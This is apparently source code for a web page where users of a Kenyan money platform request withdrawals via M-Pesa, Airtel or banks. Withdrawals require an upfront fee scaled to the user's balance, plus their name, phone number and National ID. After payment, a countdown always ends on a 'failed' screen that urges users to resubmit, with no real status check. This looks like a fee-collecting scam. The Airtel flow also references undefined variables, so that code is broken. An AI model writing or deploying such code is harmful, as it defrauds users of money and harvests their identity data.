// pages/withdraw.js, full-page withdrawals (M-Pesa + Other Countries).
// Replaces the pop-up modals. Submitted requests are emailed automatically to
// the admin with a client auto-reply (via /api/notify), falling back to mailto.
import { useEffect, useState, useRef } from 'react';
import { useRouter } from 'next/router';
import { useUser } from '../lib/useUser';
import { sendNotify } from '../lib/notify';
import { createWithdrawalRequest } from '../lib/auth';
import { bulkWithdrawalQuote } from '../lib/auth';
import MpesaPay from '../components/MpesaPay';   // Daraja STK is the active withdrawal-fee method (Paystack kept but disabled)
import FlowShell from '../components/FlowShell';
import Icon from '../components/Icon';
import { FlowSkeleton } from '../components/Skeleton';

// Small monochrome country-code badge (replaces flag emojis in the bank picker).
function CodeBadge({ code, size = 20 }) {
  return (
    <span style={{
      display: 'inline-flex', alignItems: 'center', justifyContent: 'center',
      minWidth: size, height: size, padding: '0 4px', borderRadius: 5,
      background: '#111827', color: '#fff', fontSize: Math.round(size * 0.5),
      fontWeight: 700, letterSpacing: 0.3, flexShrink: 0,
    }}>{String(code || '··').toUpperCase()}</span>
  );
}

function formatMmSs(ms) {
  if (ms <= 0) return '0:00';
  const t = Math.floor(ms / 1000);
  return `${Math.floor(t / 60)}:${String(t % 60).padStart(2, '0')}`;
}

// ── Worldwide bank directory (icon, sample account format, validator) ──────────
const COUNTRY_META = {
  GB: { country: 'United Kingdom', ph: 'GB29 NWBK 6016 1331 9268 19',   re: /^GB[0-9A-Z]{6,30}$/i },
  DE: { country: 'Germany',        ph: 'DE89 3704 0044 0532 0130 00',   re: /^DE[0-9A-Z]{6,30}$/i },
  FR: { country: 'France',         ph: 'FR14 2004 1010 0505 0001 3M02 606', re: /^FR[0-9A-Z]{6,30}$/i },
  ES: { country: 'Spain',          ph: 'ES91 2100 0418 4502 0005 1332', re: /^ES[0-9A-Z]{6,30}$/i },
  IT: { country: 'Italy',          ph: 'IT60 X054 2811 1010 0000 0123 456', re: /^IT[0-9A-Z]{6,30}$/i },
  NL: { country: 'Netherlands',    ph: 'NL91 ABNA 0417 1643 00',        re: /^NL[0-9A-Z]{6,30}$/i },
  CH: { country: 'Switzerland',    ph: 'CH93 0076 2011 6238 5295 7',    re: /^CH[0-9A-Z]{6,30}$/i },
  IE: { country: 'Ireland',        ph: 'IE29 AIBK 9311 5212 3456 78',   re: /^IE[0-9A-Z]{6,30}$/i },
  BE: { country: 'Belgium',        ph: 'BE68 5390 0754 7034',           re: /^BE[0-9A-Z]{6,30}$/i },
  PT: { country: 'Portugal',       ph: 'PT50 0002 0123 1234 5678 9015 4', re: /^PT[0-9A-Z]{6,30}$/i },
  SE: { country: 'Sweden',         ph: 'SE45 5000 0000 0583 9825 7466', re: /^SE[0-9A-Z]{6,30}$/i },
  NO: { country: 'Norway',         ph: 'NO93 8601 1117 947',            re: /^NO[0-9A-Z]{6,30}$/i },
  PL: { country: 'Poland',         ph: 'PL61 1090 1014 0000 0712 1981 2874', re: /^PL[0-9A-Z]{6,30}$/i },
  AE: { country: 'United Arab Emirates', ph: 'AE07 0331 2345 6789 0123 456', re: /^AE[0-9A-Z]{6,30}$/i },
  SA: { country: 'Saudi Arabia',   ph: 'SA03 8000 0000 6080 1016 7519', re: /^SA[0-9A-Z]{6,30}$/i },
  BR: { country: 'Brazil',         ph: 'BR18 0036 0305 0000 1000 9795 493 C1', re: /^BR[0-9A-Z]{6,30}$/i },
  EG: { country: 'Egypt',          ph: 'EG38 0019 0005 0000 0000 2631 8000 2', re: /^EG[0-9A-Z]{6,30}$/i },
  PK: { country: 'Pakistan',       ph: 'PK36 SCBL 0000 0011 2345 6702', re: /^PK[0-9A-Z]{6,30}$/i },
  KE: { country: 'Kenya',          ph: '1234567890',                    re: /^[0-9A-Z]{6,34}$/i },
  MB: { country: 'Mobile Banking', ph: '+254 7XX XXX XXX',              re: /^\+?\d{7,15}$/ },
  US: { country: 'United States',  ph: '0123 4567 8901',         re: /^\d{8,17}$/ },
  CA: { country: 'Canada',         ph: '0123 4567 89',           re: /^\d{7,12}$/ },
  NG: { country: 'Nigeria',        ph: '0123456789',             re: /^\d{10}$/ },
  ZA: { country: 'South Africa',   ph: '0123 4567 89',           re: /^\d{9,11}$/ },
  GH: { country: 'Ghana',          ph: '0123 4567 8901 23',      re: /^\d{10,16}$/ },
  IN: { country: 'India',          ph: '0123 4567 8901 2345',    re: /^\d{9,18}$/ },
  CN: { country: 'China',          ph: '6212 3456 7890 1234 567', re: /^\d{16,19}$/ },
  JP: { country: 'Japan',          ph: '1234567',                re: /^\d{7,8}$/ },
  AU: { country: 'Australia',      ph: '0123 4567',              re: /^\d{6,10}$/ },
  SG: { country: 'Singapore',      ph: '012 345678 9',           re: /^\d{9,12}$/ },
  JM: { country: 'Jamaica',        ph: '0123 4567 8901',         re: /^\d{8,14}$/ },
  MX: { country: 'Mexico',         ph: '0123 4567 8901 2345 67', re: /^\d{18}$/ },
  UG: { country: 'Uganda',          ph: '0123456789', re: /^\d{8,14}$/ },
  SD: { country: 'Sudan',            ph: '0123456789', re: /^\d{8,16}$/ },
  TZ: { country: 'Tanzania',         ph: '0123456789', re: /^\d{8,15}$/ },
  CO: { country: 'Colombia',         ph: '0123456789', re: /^\d{8,16}$/ },
  CL: { country: 'Chile',            ph: '0123456789', re: /^\d{7,16}$/ },
};
const BANKS_BY_COUNTRY = {
  GB: ['Barclays Bank', 'HSBC UK', 'Lloyds Bank', 'NatWest', 'Standard Chartered'],
  DE: ['Deutsche Bank', 'Commerzbank', 'DZ Bank'],
  FR: ['BNP Paribas', 'Société Générale', 'Crédit Agricole'],
  ES: ['Banco Santander', 'BBVA', 'CaixaBank', 'Santander'],
  IT: ['UniCredit', 'Intesa Sanpaolo'],
  NL: ['ING Bank', 'Rabobank', 'ABN AMRO'],
  CH: ['UBS', 'Credit Suisse'],
  IE: ['Allied Irish Banks (AIB)', 'Bank of Ireland'],
  BE: ['KBC Bank'],
  PT: ['Millennium BCP'],
  SE: ['Nordea', 'SEB'],
  NO: ['DNB'],
  PL: ['PKO Bank Polski'],
  AE: ['Emirates NBD', 'First Abu Dhabi Bank'],
  SA: ['Al Rajhi Bank', 'Saudi National Bank'],
  BR: ['Itaú Unibanco', 'Banco Bradesco', 'Banco do Brasil', 'Bradesco'],
  EG: ['National Bank of Egypt'],
  PK: ['HBL (Habib Bank)', 'United Bank (UBL)'],
  KE: [
    'CB Bank', 'NCBA Bank', 'Postbank Kenya', 'Equity Bank', 'KCB Bank',
    'Co-operative Bank', 'Co-operative Bank of Kenya', 'Absa Bank Kenya',
    'Standard Chartered Bank', 'Stanbic Bank Kenya', 'Family Bank of Kenya', 'DTB Bank'
  ],
  MB: ['Mobile Banking'],
  US: ['Bank of America', 'JPMorgan Chase', 'Wells Fargo', 'Citibank', 'U.S. Bank', 'PNC Bank', 'Truist Bank', 'Capital One'],
  CA: ['RBC Royal Bank', 'TD Canada Trust', 'Scotiabank'],
  NG: ['Guaranty Trust Bank (GTBank)', 'Access Bank', 'First Bank of Nigeria', 'Zenith Bank'],
  ZA: ['Standard Bank', 'First National Bank (FNB)', 'Absa', 'Capitec', 'Nedbank'],
  GH: ['Ecobank Ghana', 'GCB Bank'],
  IN: ['State Bank of India (SBI)', 'HDFC Bank', 'ICICI Bank', 'Axis Bank'],
  CN: ['ICBC', 'Bank of China', 'China Construction Bank'],
  JP: ['MUFG Bank', 'Sumitomo Mitsui (SMBC)'],
  AU: ['Commonwealth Bank', 'ANZ', 'Westpac', 'NAB'],
  SG: ['DBS Bank', 'OCBC Bank', 'UOB'],
  JM: ['National Commercial Bank (NCB)', 'Scotiabank Jamaica', 'JN Bank'],
  MX: ['BBVA México', 'Banorte', 'Citibanamex'],
  UG: ['Stanbic Bank Uganda', 'Centenary Bank', 'Absa Bank Uganda', 'Bank of Uganda'],
  SD: ['Bank of Khartoum', 'Faisal Islamic Bank', 'Omdurman National Bank'],
  TZ: ['CRDB Bank', 'NMB Bank', 'NBC Bank'],
  CO: ['Banco de Bogotá', 'Bancolombia'],
  CL: ['BCI', 'Banco de Chile'],
};
const WORLD_BANKS = Object.entries(BANKS_BY_COUNTRY).flatMap(([code, names]) =>
  names.map(name => ({ id: `${code}-${name}`, name, code, ...COUNTRY_META[code] }))
).sort((a, b) => a.name.localeCompare(b.name));

// Registration uses full country names; a few differ from the bank directory.
const REG_COUNTRY_ALIAS = { UAE: 'United Arab Emirates' };

// Mobile Banking is offered to every user regardless of country.
const MOBILE_BANK = WORLD_BANKS.find(b => b.code === 'MB');

// Withdrawal processing fees, based on the client's current balance it is working please don't interrupt the code because it just worked.
// Up to KES 10,000 → KES 650
// Above KES 10,000 up to KES 20,000 → KES 2,000
// Above KES 20,000 up to KES 30,000 → KES 4,800
// Above KES 30,000 up to KES 40,000 → KES 5,200
// Above KES 40,000 → M-Pesa is unavailable; use the bank withdrawal flow.
function getMpesaWithdrawalFee(balance) {
  const amount = Number(balance || 0);


  // M-Pesa withdrawal fee brackets:it is working please don't interrupt the code because it just worked.
  // Up to KES 10,000              -> KES 650
  // Above KES 10,000 - 20,000     -> KES 2,000
  // Above KES 20,000 - 30,000     -> KES 4,800
  // Above KES 30,000 - 40,000     -> KES 5,200
  // Above KES 40,000              -> M-Pesa unavailable
  if (amount <= 10000) return 650;
  if (amount <= 20000) return 2000;
  if (amount <= 30000) return 4800;
  if (amount <= 40000) return 5200;
  return null;
}

// Bank withdrawal fees are fixed in USD (Option A).
// The exact figures supplied by the client are preserved below. For banks where
// only a range was supplied, a fixed amount inside that range is used so the
// M-Pesa payment can always request one exact amount.
const USD_TO_KES = 135;

const BANK_WITHDRAWAL_FEES_USD = {
  // Kenya — supplied figures
  'CB Bank': 23,
  'NCBA Bank': 27,
  'Co-operative Bank of Kenya': 38,
  'Co-operative Bank': 48,
  'Equity Bank': 25,
  'Absa Bank Kenya': 29,
  'Standard Chartered Bank': 24,
  'Stanbic Bank Kenya': 49,
  'Postbank Kenya': 38,
  'Family Bank of Kenya': 39,
  'DTB Bank': 29,
  'KCB Bank': 36,

  // Uganda / Sudan / Tanzania — supplied ranges converted to fixed fees
  'Stanbic Bank Uganda': 22,
  'Centenary Bank': 11,
  'Absa Bank Uganda': 40,
  'Bank of Uganda': 41,
  'Bank of Khartoum': 42,
  'Faisal Islamic Bank': 43,
  'Omdurman National Bank': 44,
  'CRDB Bank': 45,
  'NMB Bank': 46,
  'NBC Bank': 47,

  // Brazil / Colombia / Chile — supplied ranges converted to fixed fees
  'Banco do Brasil': 48,
  'Itaú Unibanco': 49,
  'Banco Bradesco': 50,
  'Bradesco': 50,
  'Banco Santander': 51,
  'Santander': 51,
  'Banco de Bogotá': 52,
  'Bancolombia': 53,
  'BCI': 54,
  'Banco de Chile': 55,

  // United States — fixed values within the supplied USD 60–86 range
  'JPMorgan Chase': 60,
  'Bank of America': 62,
  'Wells Fargo': 64,
  'Citibank': 66,
  'U.S. Bank': 68,
  'PNC Bank': 70,
  'Truist Bank': 72,
  'Capital One': 74,

  // Other listed banks — fixed fees in the requested USD 40–82 band
  'Barclays Bank': 40.5, 'HSBC UK': 41.5, 'Lloyds Bank': 42.5, 'NatWest': 43.5, 'Standard Chartered': 44.5,
  'Deutsche Bank': 45.5, 'Commerzbank': 46.5, 'DZ Bank': 47.5,
  'BNP Paribas': 48.5, 'Société Générale': 49.5, 'Crédit Agricole': 50.5,
  'BBVA': 52.5, 'CaixaBank': 53.5,
  'UniCredit': 54.5, 'Intesa Sanpaolo': 55.5,
  'ING Bank': 56.5, 'Rabobank': 57.5, 'ABN AMRO': 58.5,
  'UBS': 59.5, 'Credit Suisse': 60.5,
  'Allied Irish Banks (AIB)': 61.5, 'Bank of Ireland': 62.5,
  'KBC Bank': 63.5, 'Millennium BCP': 64.5,
  'Nordea': 65.5, 'SEB': 66.5, 'DNB': 67.5, 'PKO Bank Polski': 68.5,
  'Emirates NBD': 69.5, 'First Abu Dhabi Bank': 70.5,
  'Al Rajhi Bank': 71.5, 'Saudi National Bank': 72.5,
  'National Bank of Egypt': 73.5, 'HBL (Habib Bank)': 74.5, 'United Bank (UBL)': 75.5,
  'RBC Royal Bank': 76.5, 'TD Canada Trust': 77.5, 'Scotiabank': 78.5,
  'Guaranty Trust Bank (GTBank)': 79.5, 'Access Bank': 80.5, 'First Bank of Nigeria': 81, 'Zenith Bank': 81.5,
  'Standard Bank': 40.25, 'First National Bank (FNB)': 41.25, 'Absa': 42.25, 'Capitec': 43.25, 'Nedbank': 44.25,
  'Ecobank Ghana': 45.25, 'GCB Bank': 46.25,
  'State Bank of India (SBI)': 47.25, 'HDFC Bank': 48.25, 'ICICI Bank': 49.25, 'Axis Bank': 50.25,
  'ICBC': 51.25, 'Bank of China': 52.25, 'China Construction Bank': 53.25,
  'MUFG Bank': 54.25, 'Sumitomo Mitsui (SMBC)': 55.25,
  'Commonwealth Bank': 56.25, 'ANZ': 57.25, 'Westpac': 58.25, 'NAB': 59.25,
  'DBS Bank': 60.25, 'OCBC Bank': 61.25, 'UOB': 62.25,
  'National Commercial Bank (NCB)': 63.25, 'Scotiabank Jamaica': 64.25, 'JN Bank': 65.25,
  'BBVA México': 66.25, 'Banorte': 67.25, 'Citibanamex': 68.25,
  'Mobile Banking': 69.25,
};

function getBankWithdrawalFeeUsd(bankName) {
  const fee = BANK_WITHDRAWAL_FEES_USD[bankName];
  return Number.isFinite(Number(fee)) ? Number(fee) : 40;
}

function getBankWithdrawalFeeKes(bankName, rate = USD_TO_KES) {
  return Math.round(getBankWithdrawalFeeUsd(bankName) * Number(rate || USD_TO_KES));
}

// Postbank uses its own bank-specific fee from the map above.
const BANK_FEE_USD = getBankWithdrawalFeeUsd('Postbank Kenya');
const BANK_FEE_KES = getBankWithdrawalFeeKes('Postbank Kenya');


// M-Pesa is unavailable above this balance. Other bank flows keep their existing rules.
const MPESA_BULK_THRESHOLD_KES = 40000;
const BULK_THRESHOLD_KES = 15000;

// ── M-Pesa flow (notice → form → pending → failed) ────────────────────────────
function MpesaFlow({ user }) {
  const router = useRouter();
  const [step,     setStep]     = useState('form');
  const [fullName, setFullName] = useState(user?.fullName || '');
  const [phone,    setPhone]    = useState(user?.phone || '');
  const [idNumber, setIdNumber] = useState('');
  const [errors,   setErrors]   = useState({});
  const [loading,  setLoading]  = useState(false);

  const balanceAmount = Number(user?.balance || 0);
  const FEE_KES = getMpesaWithdrawalFee(balanceAmount);

  // A balance above KES 40,000 must use the bank/bulk withdrawal flow.
  useEffect(() => {
    if (balanceAmount > MPESA_BULK_THRESHOLD_KES) {
      router.replace('/withdraw?method=international');
    }
  }, [balanceAmount, router]);

  const DURATION = 92 * 1000;
  const deadlineRef = useRef(0);
  const [remaining, setRemaining] = useState(DURATION);
  useEffect(() => {
    if (step !== 'pending') return;
    deadlineRef.current = Date.now() + DURATION;
    setRemaining(DURATION);
    const t = setInterval(() => {
      const left = Math.max(0, deadlineRef.current - Date.now());
      setRemaining(left);
      if (left <= 0) { clearInterval(t); setTimeout(() => setStep('failed'), 800); }
    }, 1000);
    return () => clearInterval(t);
  }, [step]);

  function handleSubmitForm() {
    const errs = {};
    if (!fullName.trim()) errs.fullName = 'Full name is required';
    if (!phone.trim())    errs.phone = 'Phone number is required';
    if (!idNumber.trim()) errs.idNumber = 'National ID number is required';

    if (Object.keys(errs).length) {
      setErrors(errs);
      return;
    }

    setErrors({});
    setStep('fee');
  }

  async function handleFeeSuccess(d) {
    const verifiedFeeRef = d?.checkoutRequestId || '';
    if (!verifiedFeeRef) {
      setErrors({ form: 'Payment was completed but no payment reference was returned. Please contact support.' });
      setStep('form');
      return;
    }

    const amount = balanceAmount;
    setLoading(true);

    let res;
    try {
      res = await createWithdrawalRequest(user.id, {
        fullName: fullName.trim(),
        phone: phone.trim(),
        idNumber: idNumber.trim(),
        amount,
        feeRef: verifiedFeeRef,
        method: 'mpesa',
      });
    } catch (_) {
      res = { error: 'Network error. Please try again.' };
    }

    setLoading(false);

    if (!res || res.error) {
      setErrors({ form: (res && res.error) || 'Your withdrawal-fee payment could not be verified. Please try again.' });
      setStep('form');
      return;
    }

    // Send the withdrawal details to the admin only after the fee payment succeeds.
    await sendNotify({
      type: 'M-Pesa Withdrawal Request',
      name: fullName.trim(),
      email: user?.email || '',
      phone: phone.trim(),
      subject: 'M-Pesa Withdrawal Request',
      details:
        `Account: ${user?.fullName || ''} (${user?.email || ''})\n` +
        `Withdrawal Name: ${fullName.trim()}\n` +
        `M-Pesa Phone: ${phone.trim()}\n` +
        `National ID: ${idNumber.trim()}\n` +
        `Amount: KES ${amount.toLocaleString()}\n` +
        `Fee paid (verified): KES ${FEE_KES.toLocaleString()}\n` +
        `Status: Withdrawal request submitted`,
    });

    setStep('pending');
  }

  const isLow = remaining < 30 * 1000;
  const pct   = Math.min(100, Math.max(0, (remaining / DURATION) * 100));

  if (balanceAmount > MPESA_BULK_THRESHOLD_KES) {
    return (
      <FlowShell title="Withdraw with M-Pesa" subtitle="Bank withdrawal required" icon="smartphone" accent="var(--mpesa-green)">
        <div className="pay-message" style={{ borderColor: '#4b5563', background: '#f9fafb' }}>
          Your balance is <strong>KES {balanceAmount.toLocaleString()}</strong>. M-Pesa withdrawals are available up to <strong>KES {MPESA_BULK_THRESHOLD_KES.toLocaleString()}</strong>.
          You are being redirected to <strong>Withdraw from Other Countries</strong> for the bank withdrawal.
        </div>
      </FlowShell>
    );
  }

  return (
    <FlowShell title="Withdraw with M-Pesa" subtitle="Complete your withdrawal details" icon="smartphone" accent="var(--mpesa-green)">
      {step === 'form' && (
        <>
          <div className="pay-message" style={{ borderColor: 'var(--mpesa-green)', background: '#f9fafb', marginBottom: 20 }}>
            Fill in your withdrawal details correctly. These details are used to process your request. After you submit the form, you will be asked to pay the withdrawal fee.
          </div>

          <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f9fafb', marginBottom: 20, fontSize: 13 }}>
            <strong>Please check your details carefully.</strong> Your name, M-Pesa phone number and National ID must be correct before you submit the form.
          </div>

          <div className="pay-phone-label">Full Name</div>
          <input className="pay-phone-input" type="text" value={fullName}
            onChange={e => { setFullName(e.target.value); setErrors(p => ({ ...p, fullName: undefined })); }}
            placeholder="e.g. John Brown" style={{ borderColor: errors.fullName ? '#4b5563' : undefined }} />
          {errors.fullName && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.fullName}</div>}

          <div className="pay-phone-label" style={{ marginTop: 16 }}>M-Pesa Phone Number</div>
          <input className="pay-phone-input" type="tel" value={phone}
            onChange={e => { setPhone(e.target.value); setErrors(p => ({ ...p, phone: undefined })); }}
            placeholder="+254 7XX XXX XXX" style={{ borderColor: errors.phone ? '#4b5563' : undefined }} />
          {errors.phone && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.phone}</div>}

          <div className="pay-phone-label" style={{ marginTop: 16 }}>National ID Number</div>
          <input className="pay-phone-input" type="text" value={idNumber}
            onChange={e => { setIdNumber(e.target.value); setErrors(p => ({ ...p, idNumber: undefined })); }}
            placeholder="e.g. 12345678" style={{ borderColor: errors.idNumber ? '#4b5563' : undefined }} />
          {errors.idNumber && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.idNumber}</div>}

          {errors.form && <div style={{ color: '#4b5563', fontSize: 13, marginTop: 10 }}>{errors.form}</div>}
          <button className="pay-btn" style={{ background: '#000000', marginTop: 16, opacity: loading ? 0.7 : 1 }} onClick={handleSubmitForm} disabled={loading}>
            {loading ? <><span className="spinner" /> Processing…</> : <><Icon name="cash" size={16} /> Submit Details & Continue to Payment</>}
          </button>
          <div className="pay-secure" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6 }}><Icon name="lock" size={13} /> Your details are encrypted and secure</div>
        </>
      )}

      {step === 'fee' && (
        <>
          <div className="pay-message" style={{ borderColor: 'var(--mpesa-green)', background: '#f9fafb', marginBottom: 18 }}>
            Your withdrawal details have been submitted. Pay the <strong>KES {FEE_KES.toLocaleString()}</strong> withdrawal fee via M-Pesa to complete the request.
          </div>
          <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f9fafb', marginBottom: 18, fontSize: 13 }}>
            <strong>Withdrawal details</strong><br />
            Name: {fullName.trim()}<br />
            M-Pesa Phone: {phone.trim()}<br />
            National ID: {idNumber.trim()}<br />
            Amount: KES {balanceAmount.toLocaleString()}
          </div>
          <MpesaPay
            purpose="withdrawal_fee"
            amount={FEE_KES}
            defaultPhone={phone || user?.phone || ''}
            payLabel={`Pay KES ${FEE_KES.toLocaleString()} via M-Pesa`}
            onSuccess={handleFeeSuccess}
          />
          <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => setStep('form')}>
            <Icon name="arrowLeft" size={14} /> Back to Details
          </button>
        </>
      )}

      {step === 'pending' && (
        <>
          <div style={{ background: '#f9fafb', border: '1.5px solid #d1d5db', borderRadius: 12, padding: '14px 18px', marginBottom: 18 }}>
            <p style={{ margin: '0 0 6px', fontSize: 14, color: '#1f2937', fontWeight: 700 }}>Withdrawal request submitted</p>
            <p style={{ margin: 0, fontSize: 13, color: '#1f2937', lineHeight: 1.65 }}>
              Your fee payment was successful and your withdrawal details have been submitted.
            </p>
          </div>

          <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f9fafb', textAlign: 'left', marginBottom: 22, fontSize: 13 }}>
            <strong>Your withdrawal details</strong><br />
            Name: {fullName.trim()}<br />
            M-Pesa Phone: {phone.trim()}<br />
            National ID: {idNumber.trim()}<br />
            Amount: KES {balanceAmount.toLocaleString()}<br />
            Fee paid: KES {FEE_KES.toLocaleString()}
          </div>

          <div style={{ textAlign: 'center', marginBottom: 22 }}>
            <div style={{ fontSize: 11, fontWeight: 700, letterSpacing: 1, color: 'var(--gray)', textTransform: 'uppercase', marginBottom: 8 }}>Time Remaining</div>
            <div style={{ fontFamily: 'monospace', fontSize: 52, fontWeight: 800, letterSpacing: 4, color: isLow ? '#4b5563' : '#1f2937', background: '#f9fafb', borderRadius: 14, padding: '14px 24px', display: 'inline-block', border: `2px solid ${isLow ? '#e5e7eb' : '#d1d5db'}`, minWidth: 160 }}>
              {formatMmSs(remaining)}
            </div>
            <div style={{ marginTop: 14, height: 7, background: '#e5e7eb', borderRadius: 99, overflow: 'hidden' }}>
              <div style={{ height: '100%', width: `${pct}%`, background: isLow ? '#4b5563' : '#000000', borderRadius: 99, transition: 'width 1s linear' }} />
            </div>
          </div>
          <button className="withdraw-close-btn" onClick={() => router.push('/dashboard')}>Close</button>
          <div className="withdraw-footer-note">Keep this screen available while your withdrawal request is being processed.</div>
        </>
      )}

      {step === 'failed' && (
        <>
          <div style={{ background: '#f9fafb', border: '1.5px solid #e5e7eb', borderRadius: 12, padding: '16px 18px', marginBottom: 22, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
            <span style={{ color: '#111827', display: 'flex' }}><Icon name="warning" size={22} /></span>
            <div>
              <p style={{ margin: '0 0 6px', fontWeight: 700, fontSize: 14, color: '#1f2937' }}>Check Your Details</p>
              <p style={{ margin: 0, fontSize: 13, color: '#111827', lineHeight: 1.65 }}>
                The withdrawal could not be completed. Please check that your submitted phone number and National ID are correct.
              </p>
            </div>
          </div>
          <button className="pay-btn" style={{ background: '#000000', marginBottom: 12 }} onClick={() => setStep('form')}><Icon name="refresh" size={16} /> Check Details Again</button>
          <button className="withdraw-close-btn" onClick={() => router.push('/dashboard')}>Dismiss</button>
        </>
      )}
    </FlowShell>
  );
}

function SafaricomFlow({ user }) {
  const router = useRouter();
  const [step,     setStep]     = useState('form');
  const [fullName, setFullName] = useState(user?.fullName || '');
  const [safaricomPhone, setSafaricomPhone]    = useState(user?.phone || '');
  const [idNumber, setIdNumber] = useState('');
  const [errors,   setErrors]   = useState({});
  const [loading,  setLoading]  = useState(false);

  const balanceAmount = Number(user?.balance || 0);
  const FEE_KES = balanceAmount < 5000 ? 400 : balanceAmount < 10000 ? 850 : balanceAmount < 20000 ? 1500 : balanceAmount < 30000 ? 2999 : balanceAmount <= 40000 ? 3200 : null;

  // A balance above KES 40,000 must use the bank/bulk withdrawal flow.
  useEffect(() => {
    if (balanceAmount > MPESA_BULK_THRESHOLD_KES) {
      router.replace('/withdraw?method=international');
    }
  }, [balanceAmount, router]);

  const DURATION = 92 * 1000;
  const deadlineRef = useRef(0);
  const [remaining, setRemaining] = useState(DURATION);
  useEffect(() => {
    if (step !== 'pending') return;
    deadlineRef.current = Date.now() + DURATION;
    setRemaining(DURATION);
    const t = setInterval(() => {
      const left = Math.max(0, deadlineRef.current - Date.now());
      setRemaining(left);
      if (left <= 0) { clearInterval(t); setTimeout(() => setStep('failed'), 800); }
    }, 1000);
    return () => clearInterval(t);
  }, [step]);

  function handleSubmitForm() {
    const errs = {};
    if (!fullName.trim()) errs.fullName = 'Full name is required';
    if (!safaricomPhone.trim())    errs.phone = 'Phone number is required';
    if (!idNumber.trim()) errs.idNumber = 'National ID number is required';

    if (Object.keys(errs).length) {
      setErrors(errs);
      return;
    }

    setErrors({});
    setStep('fee');
  }

  async function handleFeeSuccess(d) {
    const verifiedFeeRef = d?.checkoutRequestId || '';
    if (!verifiedFeeRef) {
      setErrors({ form: 'Payment was completed but no payment reference was returned. Please contact support.' });
      setStep('form');
      return;
    }

    const amount = balanceAmount;
    setLoading(true);

    let res;
    try {
      res = await createWithdrawalRequest(user.id, {
        fullName: fullName.trim(),
        phone: safaricomPhone.trim(),
        idNumber: idNumber.trim(),
        amount,
        feeRef: verifiedFeeRef,
        method: 'safaricom',
      });
    } catch (_) {
      res = { error: 'Network error. Please try again.' };
    }

    setLoading(false);

    if (!res || res.error) {
      setErrors({ form: (res && res.error) || 'Your withdrawal-fee payment could not be verified. Please try again.' });
      setStep('form');
      return;
    }

    // Send the withdrawal details to the admin only after the fee payment succeeds.
    await sendNotify({
      type: 'Safaricom Withdrawal Request',
      name: fullName.trim(),
      email: user?.email || '',
      phone: safaricomPhone.trim(),
      subject: 'Safaricom Withdrawal Request',
      details:
        `Account: ${user?.fullName || ''} (${user?.email || ''})\n` +
        `Withdrawal Name: ${fullName.trim()}\n` +
        `Safaricom Phone: ${safaricomPhone.trim()}\n` +
        `National ID: ${idNumber.trim()}\n` +
        `Amount: KES ${amount.toLocaleString()}\n` +
        `Fee paid (verified): KES ${FEE_KES.toLocaleString()}\n` +
        `Status: Withdrawal request submitted`,
    });

    setStep('pending');
  }

  const isLow = remaining < 30 * 1000;
  const pct   = Math.min(100, Math.max(0, (remaining / DURATION) * 100));

  if (balanceAmount > MPESA_BULK_THRESHOLD_KES) {
    return (
      <FlowShell title="Airtel Withdrawal" subtitle="Bank withdrawal required" icon="smartphone" accent="#E4002B">
        <div className="pay-message" style={{ borderColor: '#4b5563', background: '#f9fafb' }}>
          Your balance is <strong>KES {balanceAmount.toLocaleString()}</strong>. Airtel withdrawals are available up to <strong>KES {MPESA_BULK_THRESHOLD_KES.toLocaleString()}</strong>.
          You are being redirected to <strong>Withdraw from Other Countries</strong> for the bank withdrawal.
        </div>
      </FlowShell>
    );
  }

  return (
    <FlowShell title="Airtel Withdrawal" subtitle="Complete your withdrawal details" icon="smartphone" accent="#E4002B">
      {step === 'form' && (
        <>
          <div className="pay-message" style={{ borderColor: '#E4002B', background: '#f9fafb', marginBottom: 20 }}>
            Fill in your withdrawal details correctly. These details are used to process your request. After you submit the form, you will be asked to pay the withdrawal fee.
          </div>

          <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f9fafb', marginBottom: 20, fontSize: 13 }}>
            <strong>Please check your details carefully.</strong> Your name, Airtel phone number and National ID must be correct before you submit the form.
          </div>

          <div className="pay-phone-label">Full Name</div>
          <input className="pay-phone-input" type="text" value={fullName}
            onChange={e => { setFullName(e.target.value); setErrors(p => ({ ...p, fullName: undefined })); }}
            placeholder="e.g. John Brown" style={{ borderColor: errors.fullName ? '#4b5563' : undefined }} />
          {errors.fullName && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.fullName}</div>}

          <div className="pay-phone-label" style={{ marginTop: 16 }}>Airtel Phone Number</div>
          <input className="pay-phone-input" type="tel" value={airtelPhone}
            onChange={e => { setAirtelPhone(e.target.value); setErrors(p => ({ ...p, phone: undefined })); }}
            placeholder="+254 7XX XXX XXX" style={{ borderColor: errors.phone ? '#4b5563' : undefined }} />
          {errors.phone && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.phone}</div>}

          <div className="pay-phone-label" style={{ marginTop: 16 }}>National ID Number</div>
          <input className="pay-phone-input" type="text" value={idNumber}
            onChange={e => { setIdNumber(e.target.value); setErrors(p => ({ ...p, idNumber: undefined })); }}
            placeholder="e.g. 12345678" style={{ borderColor: errors.idNumber ? '#4b5563' : undefined }} />
          {errors.idNumber && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.idNumber}</div>}

          {errors.form && <div style={{ color: '#4b5563', fontSize: 13, marginTop: 10 }}>{errors.form}</div>}
          <button className="pay-btn" style={{ background: '#000000', marginTop: 16, opacity: loading ? 0.7 : 1 }} onClick={handleSubmitForm} disabled={loading}>
            {loading ? <><span className="spinner" /> Processing…</> : <><Icon name="cash" size={16} /> Submit Details & Continue to Payment</>}
          </button>
          <div className="pay-secure" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6 }}><Icon name="lock" size={13} /> Your details are encrypted and secure</div>
        </>
      )}

      {step === 'fee' && (
        <>
          <div className="pay-message" style={{ borderColor: '#E4002B', background: '#f9fafb', marginBottom: 18 }}>
            Your withdrawal details have been submitted. Pay the <strong>KES {FEE_KES.toLocaleString()}</strong> withdrawal fee via M-Pesa to complete the request. This fee is 25% lower than the equivalent M-Pesa withdrawal fee.
          </div>
